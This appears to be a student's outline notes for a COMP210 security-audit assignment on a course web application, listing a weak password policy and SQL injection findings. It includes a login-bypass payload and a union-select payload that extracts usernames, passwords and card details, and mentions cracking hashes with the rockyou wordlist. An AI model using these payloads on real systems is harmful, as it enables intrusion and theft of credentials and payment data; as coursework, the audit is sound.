---
title: "ass01-security-audit"
aliases: 
tags: 
- assignment
- comp210
---


Jet Hughes - 9474308

# Summary of system
- function
- technology

# Flaws
## Password policy
- must have at least 5 characters and one digit.
	- not suffiecient

## SQL Injection
- can log in to admin using username: " 'or 1=1;--"
- we are able to  extract data which is displayed as the users username
- we can extract the data from the data base using this "username"
	- ' union select group_concat(username||':'||password||':'||name||':'||credit_card_number||':'||credit_card_expiry||':'||credit_card_cvv) from user as name;--
- I was able to crack 48 of the 101 passwords using the rockyou wordlist. I'm sure It would not be difficult to crack more.

## Javascript Injection


## Path traversal
## Network-Level security
## Other